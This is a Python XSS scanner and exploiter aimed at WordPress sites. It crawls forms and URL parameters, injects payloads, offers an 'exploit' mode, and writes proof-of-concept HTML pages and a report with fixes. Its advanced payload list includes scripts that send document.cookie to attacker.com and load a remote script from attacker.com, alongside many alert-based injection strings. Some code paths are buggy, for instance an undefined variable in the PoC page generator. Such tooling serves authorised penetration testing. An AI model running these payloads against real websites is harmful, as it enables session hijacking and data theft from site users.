
#!/usr/bin/env python3
"""
XSS Attack Tester (Enhanced with Exploitation Mode for WordPress)

Tests for Cross-Site Scripting (XSS) vulnerabilities and attempts controlled exploitation.
For educational purposes only - use only on websites you own or have permission to test.
"""

import sys
import argparse
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import os
import html
import random
import string
import json
import time
import uuid

# Initialize colorama
init()

class XSSTester:
    def __init__(self, target_url, output_dir="xss_tests", verbose=False, timeout=10, safe_mode=False, exploit=False):
        """
        Initialize the XSS tester.
        
        Args:
            target_url: The base URL of the website to test
            output_dir: Directory to save test results and PoCs
            verbose: Whether to show detailed output
            timeout: Request timeout in seconds
            safe_mode: Avoid generating exploitable PoCs
            exploit: Attempt to exploit critical vulnerabilities
        """
        self.target_url = target_url.rstrip('/')
        self.output_dir = output_dir
        self.verbose = verbose
        self.timeout = timeout
        self.safe_mode = safe_mode
        self.exploit = exploit
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        })
        self.forms = []
        self.links = []
        self.results = []
        self.exploits_successful = 0
        
        # Create output directory
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
    def log(self, message, level="info"):
        """Log messages with color coding."""
        if level == "info":
            print(f"{Fore.BLUE}[INFO] {message}{Style.RESET_ALL}")
        elif level == "success":
            print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
        elif level == "warning":
            print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
        elif level == "error":
            print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        elif level == "vuln":
            print(f"{Fore.RED}[VULNERABILITY] {message}{Style.RESET_ALL}")
        elif level == "exploit":
            print(f"{Fore.MAGENTA}[EXPLOIT] {message}{Style.RESET_ALL}")
            
    def verbose_log(self, message, level="info"):
        """Log messages only if verbose mode is enabled."""
        if self.verbose:
            self.log(message, level)
            
    def detect_wordpress(self):
        """Detect if the site is running WordPress."""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                self.log("Detected WordPress site", "success")
                return True
            return False
        except requests.RequestException:
            return False

    def crawl_website(self, max_pages=10):
        """Crawl the website to discover pages, forms, and links."""
        self.log(f"Starting website crawl (max {max_pages} pages)...")
        
        visited_urls = set()
        urls_to_visit = [self.target_url]
        wordpress_endpoints = [
            '/wp-login.php', '/?s=', '/my-account/', '/cart/', '/checkout/',
            '/contact/', '/register/', '/?p=1', '/?post_type=product'
        ]
        
        # Add WordPress-specific endpoints
        if self.detect_wordpress():
            for endpoint in wordpress_endpoints:
                full_url = urljoin(self.target_url, endpoint)
                if full_url not in urls_to_visit:
                    urls_to_visit.append(full_url)
        
        while urls_to_visit and len(visited_urls) < max_pages:
            url = urls_to_visit.pop(0)
            
            if url in visited_urls or not url.startswith(self.target_url):
                continue
                
            try:
                self.verbose_log(f"Crawling: {url}")
                response = self.session.get(url, timeout=self.timeout)
                visited_urls.add(url)
                
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                for form in soup.find_all('form'):
                    form_data = {
                        'url': url,
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }
                    
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        input_type = input_field.get('type', '')
                        input_name = input_field.get('name', '')
                        
                        if input_name and input_type != 'submit' and input_type != 'button':
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': input_type
                            })
                            
                    if form_data['inputs']:
                        self.forms.append(form_data)
                        
                # Find links with query parameters
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    full_url = urljoin(url, href)
                    
                    if full_url.startswith(self.target_url):
                        parsed_url = urlparse(full_url)
                        if parsed_url.query:
                            self.links.append(full_url)
                            
                        if full_url not in visited_urls:
                            urls_to_visit.append(full_url)
                            
            except requests.RequestException as e:
                self.log(f"Error crawling {url}: {e}", "error")
                
        self.log(f"Crawl completed. Found {len(visited_urls)} pages, {len(self.forms)} forms, and {len(self.links)} links with parameters.")
        
    def generate_xss_payloads(self, level="standard"):
        """Generate WordPress-specific XSS payloads."""
        # Unique ID for tracking exploits
        test_id = str(uuid.uuid4())[:8]
        
        # Basic payloads
        basic_payloads = [
            f"<script>alert('XSS-{test_id}')</script>",
            f"<img src=x onerror=alert('XSS-{test_id}')>",
            f"<svg onload=alert('XSS-{test_id}')>",
            f"\"><script>alert('XSS-{test_id}')</script>",
            f"';alert('XSS-{test_id}');//"
        ]
        
        # Standard payloads
        standard_payloads = basic_payloads + [
            f"<img src=x onerror=\"alert('XSS-{test_id}')\">",
            f"<body onload=alert('XSS-{test_id}')>",
            f"<iframe src=\"javascript:alert('XSS-{test_id}')\"></iframe>",
            f"<div onmouseover=\"alert('XSS-{test_id}')\">Hover</div>",
            f"<script>eval(atob('YWxlcnQoJ1hTUy0{test_id.encode().hex()}'))</script>",
            f"<svg><script>alert('XSS-{test_id}')</script></svg>",
            f"<a href=\"javascript:alert('XSS-{test_id}')\">Click</a>"
        ]
        
        # Advanced payloads (exploitation-focused)
        advanced_payloads = standard_payloads + [
            f"<script>fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)+'&id={test_id}')</script>",
            f"<script>document.location='https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)+'&id={test_id}'</script>",
            f"<script>setTimeout(()={{alert('XSS-{test_id}')}},100)</script>",
            f"<svg><set attributeName=onload value=alert('XSS-{test_id}')></set>",
            f"<script>new Function`alert\\`XSS-{test_id}\\``</script>",
            f"<script>with(document)body.appendChild(createElement('script')).src='https://attacker.com/xss.js?id={test_id}'</script>",
            # WordPress-specific (e.g., comment forms, search)
            f"<script>document.forms[0].s.value='XSS-{test_id}';document.forms[0].submit()</script>",
            f"<script>document.getElementById('comment').value='<script>alert(\"XSS-{test_id}\")</script>';document.forms[0].submit()</script>",
            f"<img src=x onerror=\"document.getElementById('billing_first_name').value='XSS-{test_id}';document.forms[0].submit()\">"
        ]
        
        if level == "basic":
            return basic_payloads
        elif level == "standard":
            return standard_payloads
        else:
            return advanced_payloads

    def attempt_exploit(self, vuln, form=None, url=None):
        """Attempt to exploit an XSS vulnerability."""
        exploit_result = {'success': False, 'details': '', 'captured_data': '', 'response_code': None}
        payload = vuln['payload']
        severity = vuln['severity']
        
        if severity != 'Critical':
            exploit_result['details'] = 'Exploitation skipped: Only critical vulnerabilities are exploited.'
            return exploit_result

        self.log(f"Attempting XSS exploit for {vuln.get('form_url', url)} with payload: {payload}", "exploit")
        
        try:
            if form:  # Form-based exploit
                test_data = {}
                for input_field in form['inputs']:
                    if input_field['name'] == vuln.get('field', input_field['name']):
                        test_data[input_field['name']] = payload
                    else:
                        test_data[input_field['name']] = f"test-{uuid.uuid4()}" if input_field['type'] != 'password' else ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                
                if form['method'] == 'post':
                    response = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                else:
                    response = self.session.get(form['action'], params=test_data, timeout=self.timeout)
            else:  # URL parameter-based exploit
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[vuln['parameter']] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout)

            # Check for payload execution
            test_id = re.search(r'XSS-([a-f0-9]{8})', payload)
            if test_id:
                test_id = test_id.group(1)
                if f'XSS-{test_id}' in response.text or test_id in response.text:
                    self.log(f"Exploit succeeded! Payload executed: {payload}", "exploit")
                    exploit_result['success'] = True
                    exploit_result['details'] = f"Payload executed, reflected in response with test ID: {test_id}"
                    
                    # Simulate cookie theft
                    if 'cookie' in payload.lower():
                        cookies = self.session.cookies.get_dict()
                        if cookies:
                            exploit_result['captured_data'] = f"Cookies: {json.dumps(cookies)}"
                            self.log(f"Captured cookies: {cookies}", "exploit")
                    
                    self.exploits_successful += 1
                else:
                    exploit_result['details'] = "Payload reflected but not executed (possible sanitization)."
            
            exploit_result['response_code'] = response.status_code
            exploit_result['response_snippet'] = response.text[:500]

        except requests.RequestException as e:
            exploit_result['details'] = f"Exploit failed due to request error: {e}"
            self.log(f"Exploit failed: {e}", "error")
        
        return exploit_result

    def test_form_xss(self, form, payloads):
        """Test a form for XSS vulnerabilities."""
        successful_vulnerabilities = []
        
        self.verbose_log(f"Testing form at {form['url']} (submits to {form['action']})")
        
        for payload in payloads:
            test_id = re.search(r'XSS-([a-f0-9]{8})', payload)
            test_id = test_id.group(1) if test_id else str(uuid.uuid4())[:8]
            marked_payload = payload
            
            for input_field in form['inputs']:
                data = {}
                for field in form['inputs']:
                    if field['name'] == input_field['name']:
                        data[field['name']] = marked_payload
                    else:
                        data[field['name']] = f"test-{test_id}"
                
                try:
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=data, timeout=self.timeout)
                    else:
                        response = self.session.get(form['action'], params=data, timeout=self.timeout)
                    
                    # Check for reflection
                    if marked_payload in response.text or test_id in response.text:
                        escaped_payload = html.escape(marked_payload)
                        severity = 'High'
                        vuln_type = 'Reflected XSS'
                        
                        if escaped_payload != marked_payload and escaped_payload in response.text:
                            self.verbose_log(f"Payload reflected but escaped: {payload}")
                            severity = 'Medium'
                            vuln_type = 'Escaped Reflection'
                        else:
                            self.log(f"Potential XSS vulnerability in field {input_field['name']} with payload: {payload}", "vuln")
                            if 'cookie' in payload.lower() or 'document.location' in payload.lower():
                                severity = 'Critical'
                                vuln_type = 'Exploitable XSS'
                            
                            vuln = {
                                'form_url': form['url'],
                                'action': form['action'],
                                'method': form['method'],
                                'field': input_field['name'],
                                'payload': payload,
                                'response_url': response.url,
                                'severity': severity,
                                'type': vuln_type
                            }
                            
                            if self.exploit and severity == 'Critical':
                                exploit_result = self.attempt_exploit(vuln, form=form)
                                vuln.update({
                                    'exploit_attempted': True,
                                    'exploit_success': exploit_result['success'],
                                    'exploit_details': exploit_result['details'],
                                    'exploit_captured_data': exploit_result.get('captured_data', ''),
                                    'exploit_response_code': exploit_result['response_code'],
                                    'exploit_response_snippet': exploit_result.get('response_snippet', '')
                                })
                            
                            successful_vulnerabilities.append(vuln)
                            
                except requests.RequestException as e:
                    self.verbose_log(f"Error testing form with payload {payload}: {e}", "error")
                
        return successful_vulnerabilities
        
    def test_url_parameter_xss(self, url, payloads):
        """Test URL parameters for XSS vulnerabilities."""
        successful_vulnerabilities = []
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            return successful_vulnerabilities
            
        self.verbose_log(f"Testing URL parameters in {url}")
        
        for param_name in params:
            for payload in payloads:
                test_id = re.search(r'XSS-([a-f0-9]{8})', payload)
                test_id = test_id.group(1) if test_id else str(uuid.uuid4())[:8]
                marked_payload = payload
                
                test_params = params.copy()
                test_params[param_name] = [marked_payload]
                
                query = urlencode(test_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if marked_payload in response.text or test_id in response.text:
                        escaped_payload = html.escape(marked_payload)
                        severity = 'High'
                        vuln_type = 'Reflected XSS'
                        
                        if escaped_payload != marked_payload and escaped_payload in response.text:
                            self.verbose_log(f"Payload reflected but escaped: {payload}")
                            severity = 'Medium'
                            vuln_type = 'Escaped Reflection'
                        else:
                            self.log(f"Potential XSS vulnerability in parameter {param_name} with payload: {payload}", "vuln")
                            if 'cookie' in payload.lower() or 'document.location' in payload.lower():
                                severity = 'Critical'
                                vuln_type = 'Exploitable XSS'
                            
                            vuln = {
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'test_url': test_url,
                                'response_url': response.url,
                                'severity': severity,
                                'type': vuln_type
                            }
                            
                            if self.exploit and severity == 'Critical':
                                exploit_result = self.attempt_exploit(vuln, url=url)
                                vuln.update({
                                    'exploit_attempted': True,
                                    'exploit_success': exploit_result['success'],
                                    'exploit_details': exploit_result['details'],
                                    'exploit_captured_data': exploit_result.get('captured_data', ''),
                                    'exploit_response_code': exploit_result['response_code'],
                                    'exploit_response_snippet': exploit_result.get('response_snippet', '')
                                })
                            
                            successful_vulnerabilities.append(vuln)
                            
                except requests.RequestException as e:
                    self.verbose_log(f"Error testing URL parameter with payload {payload}: {e}", "error")
                    
        return successful_vulnerabilities
        
    def generate_xss_poc_page(self, successful_tests):
        """Generate an HTML page with proof-of-concept XSS attacks."""
        if not successful_tests:
            return None
            
        filename = f"{self.output_dir}/xss_poc_{time.time()}.html"
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Proof of Concept</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                .info { background-color: #f0f0f0; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
                .warning { color: red; }
                .success { color: green; }
                .test-case { border: 1px solid #ddd; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
                .payload { background-color: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace; overflow-x: auto; }
                button { padding: 8px 12px; background-color: #4CAF50; color: white; border: none; 
                         border-radius: 4px; cursor: pointer; margin-top: 10px; }
                button:hover { background-color: #45a049; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>XSS Vulnerability Proof of Concept</h1>
                <div class="info">
                    <p class="warning">This page contains links to test Cross-Site Scripting (XSS) vulnerabilities.</p>
                    <p>These tests should only be run on websites you own or have permission to test.</p>
                </div>
                
                <h2>Discovered XSS Vulnerabilities</h2>
        """
        
        # Form-based vulnerabilities
        form_tests = [t for t in successful_tests if 'form_url' in t]
        if form_tests:
            html_content += "<h3>Form-Based XSS</h3>"
            for i, test in enumerate(form_tests):
                html_content += f"""
                <div class="test-case">
                    <h4>Test #{i+1}: {test['form_url']}</h4>
                    <p><strong>Form Action:</strong> {test['action']}</p>
                    <p><strong>Method:</strong> {test['method'].upper()}</p>
                    <p><strong>Field:</strong> {test['field']}</p>
                    <p><strong>Severity:</strong> {test['severity']}</p>
                    <p><strong>Type:</strong> {test['type']}</p>
                    <p><strong>Payload:</strong></p>
                    <div class="payload">{html.escape(test['payload'])}</div>
                """
                if test.get('exploit_attempted', False):
                    html_content += f"""
                    <p><strong>Exploit Success:</strong> {'Yes' if test['exploit_success'] else 'No'}</p>
                    <p><strong>Exploit Details:</strong> {test['exploit_details']}</p>
                    """
                    if test['exploit_success']:
                        html_content += f"<p><strong>Captured Data:</strong> {test['exploit_captured_data']}</p>"
                
                html_content += f"""
                    <button onclick="submitFormTest{i}()">Test This Vulnerability</button>
                    <script>
                        function submitFormTest{i}() {{
                            const form = document.createElement('form');
                            form.method = '{test['method']}';
                            form.action = '{test['action']}';
                            form.target = '_blank';
                """
                for input_field in next((f['inputs'] for f in self.forms if f['url'] == test['form_url'] and f['action'] == test['action']), []):
                    value = test['payload'] if input_field['name'] == test['field'] else f"test-{test_id}"
                    html_content += f"""
                            const input{input_field['name']} = document.createElement('input');
                            input{input_field['name']}.type = 'hidden';
                            input{input_field['name']}.name = '{input_field['name']}';
                            input{input_field['name']}.value = `{value}`;
                            form.appendChild(input{input_field['name']});
                    """
                
                html_content += """
                            document.body.appendChild(form);
                            form.submit();
                            document.body.removeChild(form);
                        }
                    </script>
                </div>
                """
                
        # URL parameter-based vulnerabilities
        url_tests = [t for t in successful_tests if 'parameter' in t]
        if url_tests:
            html_content += "<h3>URL Parameter-Based XSS</h3>"
            for i, test in enumerate(url_tests):
                html_content += f"""
                <div class="test-case">
                    <h4>Test #{i+1}: {test['url']}</h4>
                    <p><strong>Parameter:</strong> {test['parameter']}</p>
                    <p><strong>Severity:</strong> {test['severity']}</p>
                    <p><strong>Type:</strong> {test['type']}</p>
                    <p><strong>Payload:</strong></p>
                    <div class="payload">{html.escape(test['payload'])}</div>
                    <p><strong>Test URL:</strong></p>
                    <div class="payload">{html.escape(test['test_url'])}</div>
                """
                if test.get('exploit_attempted', False):
                    html_content += f"""
                    <p><strong>Exploit Success:</strong> {'Yes' if test['exploit_success'] else 'No'}</p>
                    <p><strong>Exploit Details:</strong> {test['exploit_details']}</p>
                    """
                    if test['exploit_success']:
                        html_content += f"<p><strong>Captured Data:</strong> {test['exploit_captured_data']}</p>"
                
                html_content += f"""
                    <button onclick="window.open('{test['test_url']}', '_blank')">Test This Vulnerability</button>
                </div>
                """
                
        html_content += """
            </div>
        </body>
        </html>
        """
        
        with open(filename, 'w') as f:
            f.write(html_content)
            
        self.log(f"Generated XSS proof-of-concept page: {filename}", "success")
        return filename
        
    def run(self, payload_level="standard"):
        """Run the XSS tester."""
        self.log(f"Starting XSS testing with {payload_level} payload level...")
        if self.exploit:
            self.log("Exploit mode enabled: Attempting to exploit critical vulnerabilities.", "warning")
        
        # Crawl the website
        self.crawl_website()
        
        if not self.forms and not self.links:
            self.log("No forms or links with parameters found to test.", "warning")
            return
            
        # Generate payloads
        payloads = self.generate_xss_payloads(payload_level)
        self.log(f"Generated {len(payloads)} XSS payloads")
        
        # Test forms
        form_results = []
        for form in self.forms:
            results = self.test_form_xss(form, payloads)
            form_results.extend(results)
            
        # Test URL parameters
        url_results = []
        for url in self.links:
            results = self.test_url_parameter_xss(url, payloads)
            url_results.extend(results)
            
        # Combine results
        self.results = form_results + url_results
        
        # Generate summary
        if self.results:
            self.log(f"Found {len(self.results)} potential XSS vulnerabilities", "vuln")
            
            severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0}
            for result in self.results:
                severity_counts[result['severity']] += 1
            
            self.log(f"Critical: {severity_counts['Critical']}, High: {severity_counts['High']}, Medium: {severity_counts['Medium']}", "info")
            if self.exploit:
                self.log(f"Successful exploits: {self.exploits_successful}", "exploit" if self.exploits_successful > 0 else "info")
            
            # Generate PoC page
            poc_file = self.generate_xss_poc_page(self.results)
            
            # Save results to JSON
            results_file = f"{self.output_dir}/xss_results.json"
            with open(results_file, 'w') as f:
                json.dump(self.results, f, indent=2)
                
            self.log(f"Results saved to {results_file}", "success")
            
            if poc_file:
                self.log(f"Open {poc_file} in a browser to manually test vulnerabilities", "info")
        else:
            self.log("No XSS vulnerabilities found", "success")
            
        # Generate report
        report_file = f"{self.output_dir}/xss_report.md"
        with open(report_file, 'w') as f:
            f.write(f"# XSS Vulnerability Report\n\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write(f"## Summary\n\n")
            f.write(f"- Total vulnerabilities found: {len(self.results)}\n")
            f.write(f"- Critical: {severity_counts.get('Critical', 0)}\n")
            f.write(f"- High: {severity_counts.get('High', 0)}\n")
            f.write(f"- Medium: {severity_counts.get('Medium', 0)}\n")
            if self.exploit:
                f.write(f"- Successful exploits: {self.exploits_successful}\n")
            f.write("\n")
            
            f.write(f"## Form-Based Vulnerabilities\n\n")
            if form_results:
                f.write("| URL | Field | Type | Severity | Exploit Success |\n")
                f.write("|-----|-------|------|----------|-----------------|\n")
                for result in form_results:
                    exploit = '✓' if result.get('exploit_success', False) else '✗' if result.get('exploit_attempted', False) else '-'
                    f.write(f"| {result['form_url']} | {result['field']} | {result['type']} | {result['severity']} | {exploit} |\n")
                f.write("\n")
                for i, result in enumerate(form_results):
                    f.write(f"### Vulnerability #{i+1}\n\n")
                    f.write(f"- **URL**: {result['form_url']}\n")
                    f.write(f"- **Form Action**: {result['action']}\n")
                    f.write(f"- **Method**: {result['method'].upper()}\n")
                    f.write(f"- **Vulnerable Field**: {result['field']}\n")
                    f.write(f"- **Type**: {result['type']}\n")
                    f.write(f"- **Severity**: {result['severity']}\n")
                    f.write(f"- **Payload**: `{result['payload']}`\n")
                    f.write(f"- **Response URL**: {result['response_url']}\n")
                    if result.get('exploit_attempted', False):
                        f.write(f"- **Exploit Success**: {'Yes' if result['exploit_success'] else 'No'}\n")
                        f.write(f"- **Exploit Details**: {result['exploit_details']}\n")
                        if result['exploit_success']:
                            f.write(f"- **Captured Data**: {result['exploit_captured_data']}\n")
                        f.write(f"- **Response Code**: {result['exploit_response_code']}\n")
                        f.write(f"- **Response Snippet**: {result['exploit_response_snippet']}\n")
                    f.write("\n")
            else:
                f.write("No form-based vulnerabilities found.\n\n")
                
            f.write(f"## URL Parameter-Based Vulnerabilities\n\n")
            if url_results:
                f.write("| URL | Parameter | Type | Severity | Exploit Success |\n")
                f.write("|-----|-----------|------|----------|-----------------|\n")
                for result in url_results:
                    exploit = '✓' if result.get('exploit_success', False) else '✗' if result.get('exploit_attempted', False) else '-'
                    f.write(f"| {result['url']} | {result['parameter']} | {result['type']} | {result['severity']} | {exploit} |\n")
                f.write("\n")
                for i, result in enumerate(url_results):
                    f.write(f"### Vulnerability #{i+1}\n\n")
                    f.write(f"- **URL**: {result['url']}\n")
                    f.write(f"- **Vulnerable Parameter**: {result['parameter']}\n")
                    f.write(f"- **Type**: {result['type']}\n")
                    f.write(f"- **Severity**: {result['severity']}\n")
                    f.write(f"- **Payload**: `{result['payload']}`\n")
                    f.write(f"- **Test URL**: {result['test_url']}\n")
                    f.write(f"- **Response URL**: {result['response_url']}\n")
                    if result.get('exploit_attempted', False):
                        f.write(f"- **Exploit Success**: {'Yes' if result['exploit_success'] else 'No'}\n")
                        f.write(f"- **Exploit Details**: {result['exploit_details']}\n")
                        if result['exploit_success']:
                            f.write(f"- **Captured Data**: {result['exploit_captured_data']}\n")
                        f.write(f"- **Response Code**: {result['exploit_response_code']}\n")
                        f.write(f"- **Response Snippet**: {result['exploit_response_snippet']}\n")
                    f.write("\n")
            else:
                f.write("No URL parameter-based vulnerabilities found.\n\n")
                
            f.write(f"## WordPress-Specific Recommendations\n\n")
            f.write("1. **Sanitize Inputs**: Use WordPress sanitization functions:\n")
            f.write("    ```php\n    sanitize_text_field($_POST['input']);\n")
            f.write("    ```\n")
            f.write("2. **Escape Outputs**: Use `esc_html()` or `esc_attr()`:\n")
            f.write("    ```php\n    echo esc_html($_GET['s']);\n")
            f.write("    ```\n")
            f.write("3. **Content Security Policy (CSP)**: Add CSP header:\n")
            f.write("    ```php\n    header('Content-Security-Policy: default-src \\'self\\'; script-src \\'self\\';');\n")
            f.write("    ```\n")
            f.write("4. **Security Plugins**: Install Wordfence or iThemes Security.\n")
            f.write("5. **WooCommerce**: Sanitize fields in `woocommerce/templates/`:\n")
            f.write("    ```php\n    esc_html($billing_first_name);\n")
            f.write("    ```\n")
            f.write("6. **Test in Staging**: Re-run exploits in a staging environment.\n")
                
        self.log(f"Report saved to {report_file}", "success")
        return self.results
        
def main():
    """Main function to run the XSS tester."""
    parser = argparse.ArgumentParser(description="XSS Attack Tester (WordPress Enhanced)")
    parser.add_argument("url", help="Target WordPress URL to test")
    parser.add_argument("-o", "--output", default="xss_tests", help="Output directory for test pages and results")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-l", "--level", choices=["basic", "standard", "advanced"], default="standard",
                        help="Payload complexity level")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--safe-mode", action="store_true", help="Avoid generating exploitable PoCs")
    parser.add_argument("--exploit", action="store_true", help="Attempt to exploit critical vulnerabilities")
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}XSS Attack Tester (WordPress Enhanced){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: Use only on websites you own or have permission to test. Exploitation mode may trigger security plugins or affect user sessions.{Style.RESET_ALL}\n")
    
    tester = XSSTester(
        args.url, args.output, args.verbose, args.timeout, args.safe_mode, args.exploit
    )
    tester.run(args.level)
        
if __name__ == "__main__":
    main()
